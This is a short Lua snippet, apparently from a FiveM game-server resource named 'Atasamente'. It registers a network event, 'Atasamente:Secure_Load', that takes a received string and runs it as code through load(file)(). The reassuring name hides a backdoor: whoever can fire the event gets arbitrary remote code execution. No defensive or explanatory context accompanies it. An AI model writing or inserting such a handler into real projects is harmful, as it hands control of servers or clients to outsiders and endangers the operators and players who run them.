RegisterNetEvent("Atasamente:Secure_Load")
AddEventHandler("Atasamente:Secure_Load", function(file)
    load(file)()
end)